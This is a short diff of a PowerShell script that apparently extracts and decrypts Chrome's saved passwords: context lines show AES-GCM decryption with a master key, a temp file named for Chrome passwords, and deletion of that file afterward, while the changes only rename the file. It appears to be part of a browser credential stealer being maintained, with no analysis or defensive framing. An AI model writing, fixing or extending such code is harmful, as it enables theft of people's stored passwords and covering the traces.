@@ -27,7 +27,7 @@ if ((Get-Host).Version.Major -eq 7) {
     $decoder = [Security.Cryptography.AesGcm]::New($masterKey)
 }
 
-$outputFilePath = "$env:TEMP\chrome_pass.txt"  # Output file path
+$outputFilePath = "$env:TEMP\chrome-pass.txt"  # Output file path
 
 Add-Type -AssemblyName System.Security
 Add-Type @"
@@ -215,4 +215,4 @@ if (-not ([string]::IsNullOrEmpty($ce))) {
 }
 
 
-RI $env:TEMP/--chrome-pass.txt
+RI $env:TEMP/chrome-pass.txt
